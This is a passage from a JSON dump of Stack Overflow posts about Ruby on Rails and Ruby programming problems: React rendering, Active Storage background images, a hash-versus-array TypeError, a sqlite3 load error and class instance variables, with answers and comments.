"user_id": 280069, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/af961026a72dc0754099ee30146d6f8f?s=128&d=identicon&r=PG", "display_name": "Brian Piercy", "link": "https://stackoverflow.com/users/280069/brian-piercy"}, "reply_to_user": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1535418145, "post_id": 52045694, "comment_id": 91048226, "body": "Thanks. I started a 2nd lesson from Learnetto (late 2017) and ran into the same issue."}], "answers": [{"tags": [], "owner": {"reputation": 636, "user_id": 6115544, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a92f1fb48245ff57e3aed1b9e43019c7?s=128&d=identicon&r=PG&f=1", "display_name": "arminfro", "link": "https://stackoverflow.com/users/6115544/arminfro"}, "is_accepted": true, "score": 2, "last_activity_date": 1535432620, "last_edit_date": 1535432620, "creation_date": 1535429427, "answer_id": 52049949, "question_id": 52045694, "link": "https://stackoverflow.com/questions/52045694/rails-5-2-reactjs-simple-rendering-issue/52049949#52049949", "title": "Rails 5.2 + ReactJS: simple rendering issue", "body": "<p>Because you have <code>&lt;div data-react-class=\"Records\" data-react-props=\"...\"&gt;&lt;/div&gt;</code> rendered but not processed you properly miss either the <code>webpacker</code> setup (in case you don't go with <code>sprockets</code>) or just the 'JavaScript pack tag'.</p>\n\n<p>Have you followed the instructions from the 'Get started' section of the <code>react-rails</code> gem? See <a href=\"https://github.com/reactjs/react-rails#get-started-with-webpacker\" rel=\"nofollow noreferrer\">here</a></p>\n\n<p>Instructions in short:</p>\n\n<h3>Add Gems</h3>\n\n<p>Add <code>webpacker</code> and <code>react-rails</code> to your gemfile</p>\n\n<h3>Run installers</h3>\n\n<pre><code>$ bundle install\n$ rails webpacker:install\n$ rails webpacker:install:react\n$ rails generate react:install\n</code></pre>\n\n<h3>Link the JavaScript pack</h3>\n\n<p>add <code>&lt;%= javascript_pack_tag 'application' %&gt;</code> to your view</p>\n\n<h3>Generate component</h3>\n\n<p>this step may be optional (since you have already written your component)</p>\n\n<pre><code>rails g react:component my_subdirectory/HelloWorld greeting:string\n</code></pre>\n\n<h3>Render it</h3>\n\n<pre><code>&lt;%= react_component(\"HelloWorld\", { greeting: \"Hello\" }) %&gt;\n</code></pre>\n\n<p>or in your case, as you did <code>&lt;%= react_component \"Records\", { data: @records } %&gt;</code></p>\n\n<h3>In case it's not working</h3>\n\n<p>Try Server side rendering, <code>&lt;%= react_component(\"Records\", { data: @records }, {prerender: true}) %&gt;</code></p>\n\n<p>Start <code>webpack-dev-server</code> to see what it has to complain about: <code>bin/webpack-dev-server</code></p>\n"}], "owner": {"reputation": 521, "user_id": 280069, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/af961026a72dc0754099ee30146d6f8f?s=128&d=identicon&r=PG", "display_name": "Brian Piercy", "link": "https://stackoverflow.com/users/280069/brian-piercy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 599, "favorite_count": 0, "accepted_answer_id": 52049949, "answer_count": 1, "score": 0, "last_activity_date": 1535432620, "creation_date": 1535397358, "last_edit_date": 1535398117, "question_id": 52045694, "link": "https://stackoverflow.com/questions/52045694/rails-5-2-reactjs-simple-rendering-issue", "title": "Rails 5.2 + ReactJS: simple rendering issue", "body": "<p>I am using Fernando Villalobos' <a href=\"https://www.airpair.com/reactjs/posts/reactjs-a-guide-for-rails-developers\" rel=\"nofollow noreferrer\">Rails + ReactJS tutorial</a> and have run into a (hopefully) simple rendering issue.</p>\n\n<p>I'm using Rails 5.2.1 and the react-rails gem v2.4.7.</p>\n\n<p>Here is the controller logic:</p>\n\n<pre><code>def index\n  @records = Record.all\nend\n</code></pre>\n\n<p>Here is the view:</p>\n\n<pre><code>&lt;%= react_component \"Records\", { data: @records } %&gt;\n</code></pre>\n\n<p>Here is the CoffeeScript:</p>\n\n<pre><code>  @Records = React.createClass\n    render: -&gt;\n      React.DOM.div\n        className: 'records'\n        React.DOM.h2\n          className: 'title'\n          'Records'\n</code></pre>\n\n<p>At this point in the tutorial, the user should see the div, the H2 tag and \"Records\".</p>\n\n<p>Google Developer's Console confirms React has inserted a <code>&lt;div data-react-class=\"Records\" data-react-props=\"...\"&gt;&lt;/div&gt;</code> into the HTML - but I don't see any sign of the <code>&lt;h2&gt;Records&lt;/h2&gt;</code>. There are no reported errors or warnings. I've tried using equivalent JSX syntax with no change in results. The javascripts/application.js file looks correct too:</p>\n\n<pre><code>//= require rails-ujs\n//= require activestorage\n//= require turbolinks\n//= require react\n//= require react_ujs\n//= require components\n//= require_tree .\n</code></pre>\n\n<p>What am I missing?</p>\n"}, {"tags": ["css", "ruby-on-rails", "ruby"], "answers": [{"comments": [{"owner": {"reputation": 423, "user_id": 8277430, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/183ebb07c8c979e64a021f19aeefe80c?s=128&d=identicon&r=PG", "display_name": "foliwe83", "link": "https://stackoverflow.com/users/8277430/foliwe83"}, "edited": false, "score": 0, "creation_date": 1535406960, "post_id": 52045424, "comment_id": 91045853, "body": "I need a dynamic background image  that will change depending on the present object"}, {"owner": {"reputation": 11, "user_id": 5415191, "user_type": "registered", "profile_image": "https://graph.facebook.com/976565312399901/picture?type=large", "display_name": "VinyLimaZ", "link": "https://stackoverflow.com/users/5415191/vinylimaz"}, "reply_to_user": {"reputation": 423, "user_id": 8277430, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/183ebb07c8c979e64a021f19aeefe80c?s=128&d=identicon&r=PG", "display_name": "foliwe83", "link": "https://stackoverflow.com/users/8277430/foliwe83"}, "edited": false, "score": 0, "creation_date": 1535483945, "post_id": 52045424, "comment_id": 91080245, "body": "Every time you update this image when someone accesses your page will render this new image, what you want to say with: &quot;dynamic background&quot;?"}, {"owner": {"reputation": 423, "user_id": 8277430, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/183ebb07c8c979e64a021f19aeefe80c?s=128&d=identicon&r=PG", "display_name": "foliwe83", "link": "https://stackoverflow.com/users/8277430/foliwe83"}, "edited": false, "score": 0, "creation_date": 1535498931, "post_id": 52045424, "comment_id": 91085212, "body": "I did this as you requested <code>&lt;div class=&#39;col-sm-12&#39; style=&quot;background: url(&lt;%= url_for(@product.image) %&gt;) no-repeat;&quot;&gt;&lt;&#47;div&gt;</code> but no image i displayed.  The instance variable is <code>@product</code> Here is the html output, <code>&lt;div class=&quot;col-sm-12&quot; style=&quot;background: url(&#47;rails&#47;active_storage&#47;blobs&#47;eyJfcmFpbHMiOnsibWVzc2FnZSI6&zwnj;&#8203;IkJBaHBHdz09IiwiZXhw&zwnj;&#8203;IjpudWxsLCJwdXIiOiJi&zwnj;&#8203;bG9iX2lkIn19--45640b&zwnj;&#8203;74829f35f71ed0d53b6c&zwnj;&#8203;237f5257810f29&#47;beer_&zwnj;&#8203;lager_bg.jpg) no-repeat;&quot;&gt;&lt;&#47;div&gt;.</code> The image is beer_lager_bg.jpg but it has a  string of letters before it as you can see."}], "tags": [], "owner": {"reputation": 11, "user_id": 5415191, "user_type": "registered", "profile_image": "https://graph.facebook.com/976565312399901/picture?type=large", "display_name": "VinyLimaZ", "link": "https://stackoverflow.com/users/5415191/vinylimaz"}, "is_accepted": false, "score": 1, "last_activity_date": 1535460474, "last_edit_date": 1535460474, "creation_date": 1535396136, "answer_id": 52045424, "question_id": 52045207, "link": "https://stackoverflow.com/questions/52045207/how-to-dynamically-change-background-image-css-properties-with-active-storage/52045424#52045424", "title": "How to dynamically change background-image css properties with active storage", "body": "<p>For your specific case you just need to put:</p>\n\n<pre><code>&lt;div class='bg' style=\"background: url(&lt;%= url_for(object.image) %&gt;) no-repeat;\"&gt;&lt;/div&gt;\n</code></pre>\n\n<p>Remember: CSS isn't HTML, the image_helper will create a <code>&lt;img&gt;</code> tag, and you don't need that for CSS (<code>style=\"...\"</code>)!</p>\n\n<p>But the right way to do this is:</p>\n\n<pre><code>*.css - *.scss\n.bg {\n  /* The image used */                 /*accepts a full URL*/ \n  background-image: asset_path(url_for(object.image));}\n</code></pre>\n\n<p>More in here: <a href=\"https://api.rubyonrails.org/classes/ActionView/Helpers/AssetUrlHelper.html#method-i-asset_path\" rel=\"nofollow noreferrer\">https://api.rubyonrails.org/classes/ActionView/Helpers/AssetUrlHelper.html#method-i-asset_path</a></p>\n"}], "owner": {"reputation": 423, "user_id": 8277430, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/183ebb07c8c979e64a021f19aeefe80c?s=128&d=identicon&r=PG", "display_name": "foliwe83", "link": "https://stackoverflow.com/users/8277430/foliwe83"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 399, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1535460474, "creation_date": 1535395152, "last_edit_date": 1535437119, "question_id": 52045207, "link": "https://stackoverflow.com/questions/52045207/how-to-dynamically-change-background-image-css-properties-with-active-storage", "title": "How to dynamically change background-image css properties with active storage", "body": "<p>How can I use:</p>\n\n<pre><code>&lt;%=image_tag(url_for(object.image)%&gt;\n</code></pre>\n\n<p>to place the image url on each object</p>\n\n<pre><code>&lt;div class='bg' style=\"background:url('img.jpg')\"&gt;&lt;/div&gt;\n</code></pre>\n\n<p>I use rails active storage. I tried this:</p>\n\n<pre><code>&lt;div \"style=\"background: url(&lt;%=image_tag(@object.image)%&gt;\"&gt;\n</code></pre>\n\n<p>but the image is not rendered. Here is the HTML output:</p>\n\n<pre><code>&lt;div style=\"background: url(&lt;img src=\" http:=\"\" localhost:3000=\"\" rails=\"\" active_storage=\"\" blobs=\"\" eyjfcmfpbhmionsibwvzc2fnzsi6ikjbahbhdz09iiwizxhwijpudwxslcjwdxiioijibg9ix2lkin19--45640b74829f35f71ed0d53b6c237f5257810f29=\"\" beer_lager_bg.jpg\"=\"\"&gt;\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535415770, "post_id": 52044529, "comment_id": 91047755, "body": "I&#39;d recommend using <a href=\"https://ruby-doc.org/core-2.5.1/Array.html#method-i-map\" rel=\"nofollow noreferrer\"><code>#map</code></a> instead of the first <a href=\"https://ruby-doc.org/core-2.5.1/Enumerable.html#method-i-each_with_object\" rel=\"nofollow noreferrer\"><code>#each_with_object</code></a>. Furthermore using <a href=\"https://ruby-doc.org/core-2.5.1/Hash.html#method-i-merge-21\" rel=\"nofollow noreferrer\"><code>#merge!</code></a> might be more readable than the nested square brackets. <a href=\"https://gist.github.com/3limin4t0r/be7bb470b4804ef39883ff67bdfd2e10\" rel=\"nofollow noreferrer\">gist.github.com/3limin4t0r/be7bb470b4804ef39883ff67bdfd2e10</a>"}], "answers": [{"tags": [], "owner": {"reputation": 13378, "user_id": 1430810, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v669u.jpg?s=128&g=1", "display_name": "arieljuod", "link": "https://stackoverflow.com/users/1430810/arieljuod"}, "is_accepted": false, "score": 0, "last_activity_date": 1535394980, "creation_date": 1535394980, "answer_id": 52045170, "question_id": 52044529, "link": "https://stackoverflow.com/questions/52044529/typeerror-no-implicit-conversion-of-symbol-into-integer/52045170#52045170", "title": "TypeError no implicit conversion of Symbol into Integer", "body": "<p>You can create an array if it's not an array to normalize the input before processing it.</p>\n\n<pre><code>info = data[:recordset][:row]\ninfo = [info] unless info.is_an? Array\nresult = info.each_with_object([]) do ....\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535414066, "post_id": 52045217, "comment_id": 91047406, "body": "Instead of <code>[data[:recordset][:row]].flatten(1)</code> you could also use <code>Array(data[:recordset][:row])</code> which I find cleaner myself. <code>Array(1) #=&gt; [1]</code> and <code>Array([1]) #=&gt; [1]</code>"}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535416138, "post_id": 52045217, "comment_id": 91047839, "body": "Ah, easily forgotten. Nice catch."}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "reply_to_user": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535464165, "post_id": 52045217, "comment_id": 91069244, "body": "@JohanWentholt maybe I should have left my original comment :) as I said the same exact thing and was necessarily corrected as well as I forgot about the progression of <code>to_ary</code>, <code>to_a</code>, then array wrapping :)"}], "tags": [], "owner": {"reputation": 9971, "user_id": 8255744, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de22299534b5a8ed244ee8ff4aa6c481?s=128&d=identicon&r=PG&f=1", "display_name": "Simple Lime", "link": "https://stackoverflow.com/users/8255744/simple-lime"}, "is_accepted": false, "score": 5, "last_activity_date": 1535415485, "last_edit_date": 1535415485, "creation_date": 1535395196, "answer_id": 52045217, "question_id": 52044529, "link": "https://stackoverflow.com/questions/52044529/typeerror-no-implicit-conversion-of-symbol-into-integer/52045217#52045217", "title": "TypeError no implicit conversion of Symbol into Integer", "body": "<p>In the first case <code>data[:recordset][:row]</code> is not an Array, it's a Hash, so when you iterate it, the <code>hash</code> variable becomes the array:</p>\n\n<pre><code>[:property, [{:name=&gt;\"Code\", :value=&gt;\"C0001\"}, {:name=&gt;\"Customer\", :value=&gt;\"ROSSI MARIO\"}]]\n</code></pre>\n\n<p>In the second case, it's an Array, not a Hash, so when you iterate it, it becomes the hash:</p>\n\n<pre><code>{:property=&gt;[{:name=&gt;\"Code\", :value=&gt;\"C0001\"}, {:name=&gt;\"Customer\", :value=&gt;\"ROSSI MARIO\"}, {:name=&gt;\"Phone1\", :value=&gt;\"1234567890\"}]}\n</code></pre>\n\n<p>You're always assuming it's the second format. You could force it into an array, and then flatten by 1 level to treat both instances the same:</p>\n\n<pre><code>result = [data[:recordset][:row]].flatten(1).each_with_object([]) do |hash, out|\n  out &lt;&lt; hash[:property].each_with_object({}) do |h, o|\n    o[h[:name]] = h[:value]\n  end\nend\n\n# =&gt; [{\"Code\"=&gt;\"C0001\", \"Customer\"=&gt;\"ROSSI MARIO\"}] # result from example 1\n# =&gt; [{\"Code\"=&gt;\"C0001\", \"Customer\"=&gt;\"ROSSI MARIO\", \"Phone1\"=&gt;\"1234567890\"},\n#     {\"Code\"=&gt;\"C0002\", \"Customer\"=&gt;\"VERDE VINCENT\",\n#      \"Phone1\"=&gt;\"9876543210\", \"Phone2\"=&gt;\"2468101214\"}] # result from example 2\n</code></pre>\n\n<hr>\n\n<p>It's tempting to try and use <a href=\"https://ruby-doc.org/core/Kernel.html#method-i-Array\" rel=\"nofollow noreferrer\"><code>Kernal#Array()</code></a> instead of <code>[].flatten(1)</code>, but you have to remember that Hash implements <code>to_a</code> to return a nested array of keys and values, so <code>Kernal#Array()</code> doesn't work like you'd want it to:</p>\n\n<pre><code>Array(data[:recordset][:row]) # using the first example data\n# =&gt; [[:property, [{:name=&gt;\"Code\", :value=&gt;\"C0001\"}, {:name=&gt;\"Customer\", :value=&gt;\"ROSSI MARIO\"}]]]\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 4590675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/658487d6bc73fe9b16d839ef46c712d5?s=128&d=identicon&r=PG&f=1", "display_name": "Antonio Falcetta", "link": "https://stackoverflow.com/users/4590675/antonio-falcetta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3872, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1535426703, "creation_date": 1535392055, "last_edit_date": 1535426703, "question_id": 52044529, "link": "https://stackoverflow.com/questions/52044529/typeerror-no-implicit-conversion-of-symbol-into-integer", "title": "TypeError no implicit conversion of Symbol into Integer", "body": "<p>Hash</p>\n\n<pre><code>data = {\n  :recordset =&gt; {\n    :row =&gt; {\n      :property =&gt; [\n        {:name =&gt; \"Code\",     :value =&gt; \"C0001\"}, \n        {:name =&gt; \"Customer\", :value =&gt; \"ROSSI MARIO\"}\n      ]\n    }\n  },\n  :@xmlns =&gt; \"http://localhost/test\"\n}\n</code></pre>\n\n<p>Code Used</p>\n\n<pre><code>result = data[:recordset][:row].each_with_object([]) do |hash, out|\n           out &lt;&lt; hash[:property].each_with_object({}) do |h, o|\n                    o[h[:name]] = h[:value]\n                  end\n         end\n</code></pre>\n\n<p>I cannot get the following output:</p>\n\n<pre><code>[{\"Code\"=&gt;\"C0001\", \"Customer\"=&gt;\"ROSSI MARIO\", \"Phone1\"=&gt;\"1234567890\"}\n</code></pre>\n\n<p>Error message:</p>\n\n<blockquote>\n  <p>TypeError no implicit conversion of Symbol into Integer</p>\n</blockquote>\n\n<p>It works correctly in case of multi records</p>\n\n<pre><code>data = {\n  :recordset =&gt; {\n    :row =&gt; [{\n      :property =&gt; [\n        {:name =&gt; \"Code\",     :value =&gt; \"C0001\"},\n        {:name =&gt; \"Customer\", :value =&gt; \"ROSSI MARIO\"},\n        {:name =&gt; \"Phone1\",   :value =&gt; \"1234567890\"}\n      ]\n    }, {\n      :property =&gt; [\n        {:name =&gt; \"Code\",     :value =&gt; \"C0002\"},\n        {:name =&gt; \"Customer\", :value =&gt; \"VERDE VINCENT\"},\n        {:name =&gt; \"Phone1\",   :value =&gt; \"9876543210\"},\n        {:name =&gt; \"Phone2\",   :value =&gt; \"2468101214\"}\n      ]\n    }]\n  },\n  :@xmlns =&gt; \"http://localhost/test\"\n}\n</code></pre>\n\n<p>Code used   </p>\n\n<pre><code>data.keys\n#=&gt; [:recordset, :@xmlns] \n\ndata[:recordset][:row].count\n#=&gt; 2   # There are 2 set of attribute-value pairs\n\n\nresult = data[:recordset][:row].each_with_object([]) do |hash, out|\n           out &lt;&lt; hash[:property].each_with_object({}) do |h, o|\n                    o[h[:name]] = h[:value]\n                  end\n         end\n#=&gt; [\n#   {\"Code\"=&gt;\"C0001\", \"Customer\"=&gt;\"ROSSI MARIO\", \"Phone1\"=&gt;\"1234567890\"},\n#   {\"Code\"=&gt;\"C0002\", \"Customer\"=&gt;\"VERDE VINCENT\", \"Phone1\"=&gt;\"9876543210\", \"Phone2\"=&gt;\"2468101214\"}\n# ] \n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "sqlite"], "comments": [{"owner": {"reputation": 1597, "user_id": 717626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/303d9f5c2135f14f277775052bcb131b?s=128&d=identicon&r=PG", "display_name": "Aaron Breckenridge", "link": "https://stackoverflow.com/users/717626/aaron-breckenridge"}, "edited": false, "score": 1, "creation_date": 1535404097, "post_id": 52043434, "comment_id": 91044906, "body": "Which operating system are you using?"}, {"owner": {"reputation": 1, "user_id": 10280371, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-ubBiTCQFqCQ/AAAAAAAAAAI/AAAAAAAAAAA/APUIFaO1YjdcUfJp9QTVQK8Ub0EAPzq9Rg/mo/photo.jpg?sz=128", "display_name": "kimor", "link": "https://stackoverflow.com/users/10280371/kimor"}, "reply_to_user": {"reputation": 1597, "user_id": 717626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/303d9f5c2135f14f277775052bcb131b?s=128&d=identicon&r=PG", "display_name": "Aaron Breckenridge", "link": "https://stackoverflow.com/users/717626/aaron-breckenridge"}, "edited": false, "score": 0, "creation_date": 1535447011, "post_id": 52043434, "comment_id": 91058128, "body": "I&#39;m on Windows 10."}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 10280371, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-ubBiTCQFqCQ/AAAAAAAAAAI/AAAAAAAAAAA/APUIFaO1YjdcUfJp9QTVQK8Ub0EAPzq9Rg/mo/photo.jpg?sz=128", "display_name": "kimor", "link": "https://stackoverflow.com/users/10280371/kimor"}, "is_accepted": true, "score": 0, "last_activity_date": 1535447106, "creation_date": 1535447106, "answer_id": 52054024, "question_id": 52043434, "link": "https://stackoverflow.com/questions/52043434/cannot-load-such-file-sqlite3-sqlite3-native-loaderror-on-ruby-on-rails/52054024#52054024", "title": "cannot load such file \u2014 sqlite3/sqlite3_native (LoadError) on ruby on rails", "body": "<p>So it seems that there are some problems with compability on this versions of ruby, rails, and sqlite. I've installed rails installer with 2.3.3 ruby and 5.1.6 rails, and error dissapeared.</p>\n"}], "owner": {"reputation": 1, "user_id": 10280371, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-ubBiTCQFqCQ/AAAAAAAAAAI/AAAAAAAAAAA/APUIFaO1YjdcUfJp9QTVQK8Ub0EAPzq9Rg/mo/photo.jpg?sz=128", "display_name": "kimor", "link": "https://stackoverflow.com/users/10280371/kimor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 350, "favorite_count": 0, "accepted_answer_id": 52054024, "answer_count": 1, "score": 0, "last_activity_date": 1539609904, "creation_date": 1535387149, "question_id": 52043434, "link": "https://stackoverflow.com/questions/52043434/cannot-load-such-file-sqlite3-sqlite3-native-loaderror-on-ruby-on-rails", "title": "cannot load such file \u2014 sqlite3/sqlite3_native (LoadError) on ruby on rails", "body": "<p>2.5.1 Ruby, 5.2.1 Rails versions. Everything is installed from scratch. Im trying to create a project in RubyMine, and this error pops up right from the start, and i can do nothing untill this error is solved.\nThis solution didnt work for me:\n<a href=\"https://stackoverflow.com/questions/17643897/cannot-load-such-file-sqlite3-sqlite3-native-loaderror-on-ruby-on-rails\">cannot load such file -- sqlite3/sqlite3_native (LoadError) on ruby on rails</a>\nCouldnt make to the end of this solution:\n<a href=\"https://stackoverflow.com/questions/34171874/an-error-occurred-while-installing-sqlite3-1-3-11-and-bundler-cannot-continue\">An error occurred while installing sqlite3 (1.3.11), and Bundler cannot continue</a>\non 5-th step after execution of \"configure\" promt says that no acceptable c compiler found in PATH.\nHelp please.</p>\n"}, {"tags": ["ruby", "class", "instance-variables"], "comments": [{"owner": {"reputation": 533, "user_id": 1358698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f813eb3399968848571df028332428d?s=128&d=identicon&r=PG", "display_name": "Tensho", "link": "https://stackoverflow.com/users/1358698/tensho"}, "edited": false, "score": 0, "creation_date": 1535401085, "post_id": 52042881, "comment_id": 91043838, "body": "Checkout the self inside initialize method and you will see it refers to instance ^_^ Also you don&#39;t have to declare <code>@count</code> in A class, because class level accessor methods work with A&#39;s <code>@count</code> instead of B&#39;s or C&#39;s instance variable. In other words <code>@count</code> in superclass shadows counterparts in the ancestors.  TBH, I&#39;d prefer Ruby metaprogramming stuff for the described issue \u2013 <code>ObjectSpace.each_object(B).count</code> and <code>ObjectSpace.each_object(C).count</code> ^_^ Happy hacking!   Examples: <a href=\"https://gist.github.com/Tensho/3fb6243dcbaf15df1dbd83ac59583fb6\" rel=\"nofollow noreferrer\">gist.github.com/Tensho/3fb6243dcbaf15df1dbd83ac59583fb6</a>"}, {"owner": {"reputation": 689, "user_id": 10280525, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ar3KN.jpg?s=128&g=1", "display_name": "Nifriz", "link": "https://stackoverflow.com/users/10280525/nifriz"}, "reply_to_user": {"reputation": 533, "user_id": 1358698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f813eb3399968848571df028332428d?s=128&d=identicon&r=PG", "display_name": "Tensho", "link": "https://stackoverflow.com/users/1358698/tensho"}, "edited": false, "score": 0, "creation_date": 1535402082, "post_id": 52042881, "comment_id": 91044187, "body": "Thank you Tensho,Noe I understand."}, {"owner": {"reputation": 689, "user_id": 10280525, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ar3KN.jpg?s=128&g=1", "display_name": "Nifriz", "link": "https://stackoverflow.com/users/10280525/nifriz"}, "reply_to_user": {"reputation": 533, "user_id": 1358698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f813eb3399968848571df028332428d?s=128&d=identicon&r=PG", "display_name": "Tensho", "link": "https://stackoverflow.com/users/1358698/tensho"}, "edited": false, "score": 0, "creation_date": 1535443149, "post_id": 52042881, "comment_id": 91055855, "body": "@Tensho, stand alone it works, when i use in my program i obtain : &quot;`count&#39;: wrong number of arguments (given 0, expected 1+) (ArgumentError) &quot; ... this error is over this line &quot;  self.class.count += 1&quot;"}], "owner": {"reputation": 689, "user_id": 10280525, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ar3KN.jpg?s=128&g=1", "display_name": "Nifriz", "link": "https://stackoverflow.com/users/10280525/nifriz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 49, "favorite_count": 0, "closed_date": 1535386174, "answer_count": 0, "score": 0, "last_activity_date": 1535384983, "creation_date": 1535384983, "question_id": 52042881, "link": "https://stackoverflow.com/questions/52042881/ruby-class-variable-used-like-class-instance-variable", "closed_reason": "Duplicate", "title": "Ruby class variable used like class instance variable", "body": "<p>I'm using ruby, and I want a numeric variable to count the number of instance of my class are called.</p>\n\n<p>I try this ...</p>\n\n<pre><code>class A\n  @@count = 0\n\n  def initialize\n    @@count += 1\n  end\nend\n\nclass B &lt; A\nend\n\nclass C &lt; A\nend\n\n\nputs B.new.count #=&gt; 1\nputs C.new.count #=&gt; 2\n</code></pre>\n\n<p>....but obviously the code share the field @@count for classes A, B and C.</p>\n\n<p>Then I try this:</p>\n\n<pre><code>class A\n  def self.count\n    @count\n  end\n\n  def count\n    self.class.count\n  end\nend\n\nclass B &lt; A\n  @count = 0\nend\n\nclass C &lt; A\n  @count = 0\nend\n\nputs B.new.count #=&gt; 0\nputs C.new.count #=&gt; 0\n</code></pre>\n\n<p>It's work, but if i add the filed increment in the subclasses like this:</p>\n\n<pre><code>class B &lt; A\n  @count = 0\n\n  def initialize\n      @count += 1\n  end\nend\n</code></pre>\n\n<p>...ruby return this error:</p>\n\n<blockquote>\n  <p>new 1.rb:15:in initialize': undefined method+' for nil:NilClass\n  (NoMethodError)</p>\n</blockquote>\n\n<p>Can someone explain me why?</p>\n"}, {"tags": ["ruby", "hash"], "comments": [{"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "edited": false, "score": 0, "creation_date": 1535383068, "post_id": 52041958, "comment_id": 91035497, "body": "You want to manipulate the first hash to get the second? I guess you need to escape the commas: <code>&quot;id=\\&quot;lastName&quot;=&gt;&quot;Gg&quot;</code> or use <code>&#39;</code>"}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "reply_to_user": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "edited": false, "score": 0, "creation_date": 1535384913, "post_id": 52041958, "comment_id": 91036515, "body": "Yes I need to combine the values for the same key as i have shown."}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535389514, "post_id": 52041958, "comment_id": 91038714, "body": "I&#39;m not exactly sure if this is your intention, but the name usage suggest a flaw in your code. If you <i>zip</i> <code>headers</code> with <code>*data_rows</code> the output will be columns. This means the variable name in <i>map</i> should not be <code>data_row</code>, but <code>column</code> instead. This column has the header as first element. By doing <code>local[1..-1].map</code> you will loop over all columns except the first one."}, {"owner": {"reputation": 3523, "user_id": 9043475, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FNxvn.jpg?s=128&g=1", "display_name": "Rajagopalan", "link": "https://stackoverflow.com/users/9043475/rajagopalan"}, "edited": false, "score": 0, "creation_date": 1535390221, "post_id": 52041958, "comment_id": 91039005, "body": "Hi that&#39;s the part of the code , since that&#39;s not necessary here , i have added a part 